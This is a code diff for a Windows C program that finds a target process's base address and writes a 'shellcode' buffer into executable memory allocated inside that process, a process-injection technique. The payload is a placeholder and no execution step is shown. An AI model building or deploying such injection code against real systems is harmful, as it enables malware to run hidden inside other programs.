@@ -72,7 +72,7 @@ INT main()
   BYTE *pBase;
   if (!(pBase = GetModuleBase(PrName, PID)))
   {
-    printf("Can not get BaseAddress of PID %d\n", PID);
+    printf("Can not get address of PID %d\n", PID);
     return 3;
   }
 
@@ -89,18 +89,34 @@ INT main()
     0);
   printf("Buffer: %s\n", localBuffer);
 
-  const DWORD64 base = (DWORD64)pBase;
-  LPCVOID SHELLCODE = &base; 
-  const SIZE_T SHELLCODE_SIZE = sizeof(SHELLCODE);
-  LPVOID shellcode = VirtualAllocEx(
+  const DWORD64 VictimAddress = (DWORD64)pBase;
+  const CHAR Shellcode[] = "SHELLCODE\xAA\xBB\xCC";
+  const SIZE_T VictimAddressSize = sizeof(VictimAddress);
+  const SIZE_T ShellcodeSize = sizeof(Shellcode);
+  const SIZE_T VictimMemorySize = VictimAddressSize + ShellcodeSize;
+  LPVOID VictimMemory = VirtualAllocEx(
     hProcess,
     NULL,
-    SHELLCODE_SIZE,
+    VictimMemorySize,
     MEM_COMMIT,
     PAGE_EXECUTE_READWRITE);
-  printf("Allocated %llu bytes at %p\n", SHELLCODE_SIZE, shellcode);
-  if (!WriteProcessMemory(hProcess, shellcode, SHELLCODE, SHELLCODE_SIZE, NULL))
-    printf("Cannot write shellcode!");
+  printf("Allocated %llu bytes at %p\n", VictimMemorySize, VictimMemory);
+  const BOOL IsBaseAddressWritten = WriteProcessMemory(
+    hProcess,
+    VictimMemory,
+    &VictimAddress,
+    VictimAddressSize,
+    NULL);
+  if (!IsBaseAddressWritten)
+    printf("Cannot write address of victim process!\n");
+  const BOOL IsShellCodeWritten = WriteProcessMemory(
+    hProcess,
+    (DWORD64 *)VictimMemory + 1,
+    Shellcode,
+    ShellcodeSize,
+    NULL);
+  if (!IsShellCodeWritten)
+    printf("Cannot write shellcode!\n");
 
   return NULL;
 }
